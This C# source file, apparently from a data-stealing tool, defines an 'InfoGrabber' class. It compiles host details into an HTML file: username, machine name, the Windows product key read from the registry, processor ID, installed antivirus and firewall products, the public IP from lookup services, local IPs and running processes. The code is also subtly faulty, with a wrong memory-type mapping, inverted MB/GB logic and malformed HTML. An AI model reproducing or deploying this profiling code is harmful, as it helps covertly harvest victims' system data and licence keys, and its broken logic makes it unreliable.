namespace PEngine.Engine.InfoPC
{
    using PEngine.Helpers;
    using System;
    using System.Management;
    using System.Net;
    using System.Net.Sockets;
    using System.Text;
    using System.Text.RegularExpressions;

    public class InfoGrabber
    {
        private static string GetMemoryType(int MemoryType)
        {
            switch (MemoryType)
            {
                case 0: { return "DDR-4"; }
                case 1: { return "Other"; }
                case 2: { return "DRAM"; }
                case 3: { return "Synchronous DRAM"; }
                case 4: { return "Cache DRAM"; }
                case 5: { return "EDO"; }
                case 6: { return "EDRAM"; }
                case 7: { return "VRAM"; }
                case 8: { return "SRAM"; }
                case 9: { return "RAM"; }
                case 10: { return "ROM"; }
                case 11: { return "Flash"; }
                case 12: { return "EEPROM"; }
                case 13: { return "FEPROM"; }
                case 14: { return "EPROM"; }
                case 15: { return "CDRAM"; }
                case 16: { return "3DRAM"; }
                case 17: { return "SDRAM"; }
                case 18: { return "SGRAM"; }
                case 19: { return "RDRAM"; }
                case 20: { return "DDR"; }
                case 21: { return "DDR-2"; }
                default:
                    return MemoryType != 1 &&
                           MemoryType <= 22
                         ? MemoryType != 25
                         ? MemoryType > 25 ? "Unknown" : "No bar set" : "FBD2" : "DDR-3";
            }
        }
        private static readonly string[] MassLink =
        {
            "https://api.ipify.org/",
            "http://icanhazip.com/",
            "https://ipinfo.io/ip",
            "http://checkip.amazonaws.com/"
        };
        private static StringBuilder Log = new StringBuilder();

        public static void CreateTable(string HomePath)
        {
            #region Main Table

            Log.Clear();
            Log.AppendLine("<!DOCTYPE html>");
            Log.AppendLine("<html>");
            Log.AppendLine("<head>");
            Log.AppendLine("<title>SystemInfo</title>");
            Log.AppendLine("<link rel=\"icon\" type=\"image/png\" href=\"http://s1.iconbird.com/ico/0612/customicondesignoffice2/w48h481339870371Personalinformation48.png\" sizes=\"32x32\">");
            Log.AppendLine("</head>");
            Log.AppendLine("<body style=\"width:100%; height:100%; margin: 0; background: url(http://radiographer.co.il/wp-content/uploads/2015/11/backgroundMain.jpg) #191919\">");
            Log.AppendLine("<center><h1 style=\"color:#85AB70; margin:50px 0\">Computer Information System</h1></center>");

            Log.AppendLine($"<center><span style=\"color:#6294B3\">Operating system: </span><span style=\"color:#BA9201\">{OSLibrary.osVersion} [ {OSLibrary.GetName()} {OSLibrary.GetEdition()} ] </span></center>");
            Log.AppendLine($"<center><span style=\"color:#6294B3\">Computer Name: </span><span style=\"color:#BA9201\">{OSLibrary.MachineName}</span></center>");
            Log.AppendLine($"<center><span style=\"color:#6294B3\">Username: </span><span style=\"color:#BA9201\">{OSLibrary.UserName}</span></center>");
            Log.AppendLine($"<center><span style=\"color:#6294B3\">Logic Processors: </span><span style=\"color:#BA9201\">{OSLibrary.ProcessorCount}</span></center>");
            Log.AppendLine($"<center><span style=\"color:#6294B3\">System Directory: </span><span style=\"color:#BA9201\">{OSLibrary.SystemDir}</span></center>");
            Log.AppendLine($"<center><span style=\"color:#6294B3\">System capacity: </span><span style=\"color:#BA9201\">{OSLibrary.GetOSBit()}</span></center>");

            #endregion

            try
            {
                using (ManagementObjectCollection Secret = new ManagementObjectSearcher(@"root\CIMV2", "SELECT * FROM Win32_Processor").Get())
                {
                    foreach (ManagementBaseObject cr in Secret)
                    {
                        string ProcessorName = cr["Name"]?.ToString();
                        string ProcID = cr["ProcessorId"]?.ToString();
                        Log.AppendLine($"<center><span style=\"color:#6294B3\">CPU: </span><span style=\"color:#BA9201\">{ProcessorName} [ <a title=\"Manufacturer: {ProcessorName}\"</span>{ProcessorName} ]</a title></center>");
                        Log.AppendLine($"<center><span style=\"color:#6294B3\">Processor ID: </span><span style=\"color:#BA9201\">{ProcID}</center>");
                        break;
                    }
                }
            }
            catch { }
            try
            {
                using (ManagementObjectCollection MonitorEx = new ManagementObjectSearcher(@"root\CIMV2", "SELECT * FROM Win32_DesktopMonitor").Get())
                {
                    foreach (ManagementBaseObject queryObj in MonitorEx)
                    {
                        if (queryObj["ScreenWidth"] == null || queryObj["ScreenHeight"] == null)
                        {
                            continue;
                        }
                        Log.AppendLine($"<center><span style=\"color:#6294B3\">Screen resolution: </span><span style=\"color:#BA9201\">{queryObj["ScreenWidth"]} x {queryObj["ScreenHeight"]} Pixels</span></center>");
                        break;
                    }
                }
            }
            catch { }
            using (ManagementObjectCollection OS = new ManagementObjectSearcher(@"root\CIMV2", "SELECT * FROM Win32_OperatingSystem").Get())
            {
                foreach (ManagementBaseObject z in OS)
                {
                    Log.AppendLine($"<center><span style=\"color:#6294B3\">Registered user: </span><span style=\"color:#BA9201\">{z["RegisteredUser"]?.ToString()}</span></center>");
                    Log.AppendLine($"<center><span style=\"color:#6294B3\">Windows Serial Key: </span><span style=\"color:#BA9201\">{WinKey.GetWindowsProductKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "DigitalProductId")}</span></center>");
                    Log.AppendLine($"<center><span style=\"color:#6294B3\">Windows Product Code: </span><span style=\"color:#BA9201\">{z["SerialNumber"]?.ToString()}</span></center>");
                    break;
                }
            }
            try
            {
                using (ManagementObjectCollection Bios = new ManagementObjectSearcher(@"root\CIMV2", "SELECT * FROM Win32_BIOS").Get())
                {
                    foreach (ManagementBaseObject obj in Bios)
                    {
                        try
                        {
                            string BiosVersion = ((string[])obj["BIOSVersion"])[0];
                            string BiosVersionTwo = ((string[])obj["BIOSVersion"])[1];
                            string Manufacturer = obj["Manufacturer"]?.ToString();

                            if (((string[])obj["BIOSVersion"]).Length <= 1)
                            {
                                Log.AppendLine($"<center><span style=\"color:#6294B3\">Bios version: <span style=\"color:#BA9201\">{BiosVersion} [ <a title=\"Manufacturer: {0x2}\">{0x2}</a title> ]</span></center>");
                            }
                            else
                            {
                                Log.AppendLine($"<center><span style=\"color:#6294B3\">Bios version: <span style=\"color:#BA9201\">{BiosVersion} - {BiosVersionTwo} [ <a title=\"Manufacturer: {Manufacturer}\">{Manufacturer}</a title> ]</span><span style=\"color:#BA9201\"></span></center>");
                            }
                        }
                        catch (OverflowException) { }
                        break;
                    }
                }
            }
            catch { }
            try
            {
                using (ManagementObjectCollection wmiData = new ManagementObjectSearcher(@"root\SecurityCenter2", "SELECT * FROM AntiVirusProduct").Get())
                {
                    foreach (ManagementBaseObject item in wmiData)
                    {
                        Log.AppendLine($"<center><span style=\"color:#6294B3\">Installed antivirus: </span><span style=\"color:#BA9201\">{item["displayName"]?.ToString()}</span></center>");
                    }
                }
            }
            catch { }
            try
            {
                using (ManagementObjectCollection FireWall = new ManagementObjectSearcher(@"root\SecurityCenter2", "SELECT * FROM FirewallProduct").Get())
                {
                    foreach (ManagementBaseObject item in FireWall)
                    {
                        Log.AppendLine($"<center><span style=\"color:#6294B3\">Installed FireWall: </span><span style=\"color:#BA9201\">{item["displayName"]?.ToString()}</span></center>");
                    }
                }
            }
            catch { }
            try
            {
                using (ManagementObjectCollection TotalMemory = new ManagementObjectSearcher(@"root\CIMV2", "SELECT TotalPhysicalMemory FROM Win32_ComputerSystem").Get())
                {
                    foreach (ManagementBaseObject Total in TotalMemory)
                    {
                        try
                        {
                            string ConverterMB = Convert.ToString(Math.Round(Convert.ToDouble(Total["TotalPhysicalMemory"]) / 0x4000_0000 * 0x3E8, 0x2));
                            string ConverterGB = Convert.ToString(Math.Round(Convert.ToDouble(Total["TotalPhysicalMemory"]) / 0x4000_0000, 0x2));
                            if (!(Convert.ToDouble(Total["TotalPhysicalMemory"]?.ToString()) / 0x4000_0000 > 0x1))
                            {
                                Log.AppendLine($"<center><span style=\"color:#6294B3\">Physical memory: </span><span style=\"color:#BA9201\">({ConverterGB} GB)</span></center>");
                            }
                            else
                            {
                                Log.AppendLine($"<center><span style=\"color:#6294B3\">Physical memory: </span><span style=\"color:#BA9201\">({ConverterMB} MB)</span></center>");
                            }
                            break;
                        }
                        catch (FormatException) { break; }
                        catch (OverflowException) { break; }
                        catch (IndexOutOfRangeException) { break; }
                        catch (ArgumentOutOfRangeException) { break; }
                    }
                }
            }
            catch { }
            try
            {
                using (ManagementObjectCollection Type = new ManagementObjectSearcher(@"root\CIMV2", "SELECT * FROM Win32_PhysicalMemory").Get())
                {
                    foreach (ManagementBaseObject ObjType in Type)
                    {
                        try
                        {
                            string MemoryType = GetMemoryType(int.Parse(ObjType["MemoryType"]?.ToString()));
                            string ConverterMB = Convert.ToString(Math.Round(Convert.ToDouble(ObjType["Capacity"]) / 0x4000_0000 * 0x3E8, 0x2));
                            string ConverterGB = Convert.ToString(Math.Round(Convert.ToDouble(ObjType["Capacity"]) / 0x4000_0000, 0x2));
                            if (Convert.ToDouble(ObjType["Capacity"]) / 0x4000_0000 <= 0x1)
                            {
                                Log.AppendLine($"<center><span style=\"color:#6294B3\">Memory type: </span><span style=\"color:#BA9201\">{MemoryType} - ( <a title=\"Memory: {ConverterMB} MB (Manufacturer: {ObjType["Manufacturer"]?.ToString()})\"</span>{ConverterMB} MB )</a title></span></center>");
                            }
                            else
                            {
                                Log.AppendLine($"<center><span style=\"color:#6294B3\">Memory type: </span><span style=\"color:#BA9201\">{MemoryType} - ( <a title=\"Memory: {ConverterGB} GB (Manufacturer: {ObjType["Manufacturer"]?.ToString()})\"</span>{ConverterGB} GB )</a title></span></center>");
                            }
                        }
                        catch (InvalidCastException) { break; }
                        catch (FormatException) { break; }
                        catch (OverflowException) { break; }
                        catch (IndexOutOfRangeException) { break; }
                        catch (ArgumentOutOfRangeException) { break; }
                    }
                }
            }
            catch { }
            try
            {
                using (ManagementObjectCollection VC = new ManagementObjectSearcher(@"root\CIMV2", "SELECT * FROM Win32_VideoController").Get())
                {
                    foreach (ManagementBaseObject w in VC)
                    {
                        string container = null;
                        try
                        {
                            switch (Convert.ToDouble(w["AdapterRam"]) / 0x10_0000 % 0x400)
                            {
                                case 0:
                                    container = string.Concat(Convert.ToDouble(w.Properties["AdapterRam"]?.Value) / 0x10_0000 / 0x400, " GB");
                                    break;
                                default:
                                    container = string.Concat((Convert.ToDouble(w.Properties["AdapterRam"]?.Value) / 0x10_0000).ToString("F2"), " MB");
                                    break;
                            }
                        }
                        catch (FormatException) { break; }
                        catch (InvalidCastException) { break; }
                        catch (OverflowException) { break; }

                        Log.AppendLine($"<center><span style=\"color:#6294B3\">Video card: </span><span style=\"color:#BA9201\">{w["Caption"]?.ToString()}  -  <a title=\"Graphics card memory: {container}\"</span>({container})</a title></tr></span></center>");
                    }
                }
            }
            catch { }
            try
            {
                using (ManagementObjectCollection SysPC = new ManagementObjectSearcher(@"root\CIMV2", "SELECT * FROM Win32_ComputerSystem").Get())
                {
                    foreach (ManagementBaseObject gob in SysPC)
                    {
                        try
                        {
                            Log.AppendLine(Regex.Replace($"<center><span style=\"color:#6294B3\">Computer model: </span><span style=\"color:#BA9201\">{gob["Manufacturer"]?.ToString()}{gob["Model"]?.ToString()}</span></center>", @"\s{2,}", " "));
                            Log.AppendLine($"<center><span style=\"color:#6294B3\">Computer Model Manufacturer: </span><span style=\"color:#BA9201\">{gob["Manufacturer"]?.ToString()}</span></center>");
                        }
                        catch { break; }
                    }
                }
            }
            catch { }
            try
            {
                for (int i = 0; i < MassLink.Length; i++)
                {
                    int iIndex = i;
                    if (NetControl.CheckURL(MassLink[iIndex]))
                    {
                        Log.AppendLine($"<center><span style=\"color:#6294B3\">Internal IP: </span><span style=\"color:#BA9201\">{NetControl.GetPublicIP(MassLink[iIndex].ToString())}</span></center>");
                        break;
                    }
                }
            }
            catch (OverflowException) { }
            try
            {
                foreach (IPAddress ip in Dns.GetHostEntry(Dns.GetHostName()).AddressList)
                {
                    if (ip.AddressFamily.Equals(AddressFamily.InterNetwork))
                    {
                        Log.AppendLine($"<center><span style=\"color:#6294B3\">Local IP: </span><span style=\"color:#BA9201\">{ip?.ToString()}</span></center>");
                    }
                }
            }
            catch (SocketException) { }
            catch (ArgumentException) { }

            Log.AppendLine($"<center><span style=\"color:#6294B3\"><details><summary>Show</span><span style=\"color:#BA9201\">Hide Running User Processes</summary><pre>{ProcessList.GetProcessPC(new StringBuilder())}</span></center>");

            Log.AppendLine("</table>");
            Log.AppendLine("</html>");
            if (Log.Length > 0)
            {
                SaveData.SaveFile(HomePath, Log?.ToString());
                Log.Clear();
            }
        }
    }
}